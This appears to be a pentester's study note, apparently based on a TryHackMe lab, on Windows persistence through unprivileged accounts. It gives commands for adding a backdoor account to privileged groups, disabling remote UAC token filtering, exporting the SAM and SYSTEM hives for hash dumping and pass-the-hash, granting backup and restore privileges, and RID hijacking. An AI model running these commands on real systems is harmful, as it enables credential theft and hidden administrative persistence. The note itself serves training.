# Windows Persistence - Tampering with Unprivileged Accounts

## Assigning Group Memebership

Unprivileged Accounts less monitored than administrative accounts Assigning Groups Memberships is a direct way to gain administrative privileges.

```powershell
net localgroup administrators hacker /add
net localgroup "Backup Operators" hacker /add # Less suspicious - cant RDP or WinRM
net localgroup "Remote Management Users" hacker /add # Same as the above but can remote in
```

`LocalAccountTokenFilterPolicy` from [[Windows-User-Account-Control]] strips any local account of its administrative privileges when logging in remotely with a limited access token with no administrative privileges, to regain those change them in the registery:

```powershell
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

With Evil-WinRm (see [[Evil-winrm-Cheatsheet]]) we can backup SAM and SYSTEM files and dowload them 

```powershell
reg save hklm\system system.bak
reg save hklm\sam sam.bak
download system.bak
download sam.bak
```

With [[Impacket-Cheatsheet]] `secretsdump.py` we can dump the hashes of those files, and use Evil-Winrm to perform a pass-the-hash attack.

## Special Privileges and Security Descriptors
For reference see the official documentation regarding [Privilege Constants](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants) and forcomplete token table [[SePrivilege-Token-Table]].

The Backup Operators group has the following:
-   **SeBackupPrivilege:** The user can read any file in the system, ignoring any DACL in place, see [[SeBackup-Privilege]]
-   **SeRestorePrivilege:** The user can write any file in the system, ignoring any DACL in place.

As this group we can assign the above privileges to any user regardless of group,
```powershell
secedit /export /cfg config.inf
# add username to the lines 
SeBackupPrivilege = *S-1-5...sid,<username>
SeRestorePrivilege = *S-1-5...sid,<username>
# convert .inf into .sdb, then load the configuration back into the system
secedit /import /cfg config.inf /db config.sdb
secedit /configure /db config.sdb /cfg config.inf
# This user can log in via WinRM; you can instead adding user to Remote Management group 
# Change the Security Descriptor; requires GUI.
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
# add user
```

## RID Hijacking
Changing some registry values to trick the operating systemlike you are the Administrator. Relateive ID (RID) is assign on user creation when that user logs in the LSASS create a access token based the RID matched from the SAM registery hive. This method will require ability to edit the registery. With [[Sysinternals-Psexec]]
```powershell 
PsExec64.exe -i -s regedit
# Computer\HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users
```



## References
[THM Windows Persistance Room](https://tryhackme.com/room/windowslocalpersistence)
[Privilege Constants](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
